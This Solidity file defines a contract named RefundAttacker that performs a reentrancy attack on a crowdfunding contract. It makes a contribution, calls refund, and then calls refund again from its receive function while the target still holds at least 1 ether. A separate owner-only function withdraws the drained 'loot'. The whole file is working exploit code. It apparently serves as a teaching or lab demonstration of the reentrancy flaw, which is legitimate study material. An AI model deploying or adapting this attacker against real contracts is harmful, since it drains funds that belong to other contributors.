// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ICrowdfundVulnerable {
    function contribute() external payable;
    function refund() external;
    function getBalance() external view returns (uint256);
}

contract RefundAttacker {
    ICrowdfundVulnerable public target;
    address public owner;

    event AttackStep(string message, uint256 attackerBalance, uint256 contractBalance);

    constructor(address _target) {
        target = ICrowdfundVulnerable(_target);
        owner = msg.sender;
    }

    function fundAndAttack() external payable {
        require(msg.value > 0, "Need ETH");

        // initial contribution
        target.contribute{value: msg.value}();

        // trigger first refund
        target.refund();

        emit AttackStep("Fund and first refund triggered", address(this).balance, address(target).balance);
    }

    receive() external payable {
        emit AttackStep("Reentrancy executing...", address(this).balance, address(target).balance);

        if (address(target).balance >= 1 ether) {
            target.refund();
        }
    }

    function withdrawLoot() external {
        require(msg.sender == owner, "Not owner");

        uint256 amount = address(this).balance;
        payable(owner).transfer(amount);

        emit AttackStep("Loot withdrawn to owner", 0, address(target).balance);
    }

    function getMyBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
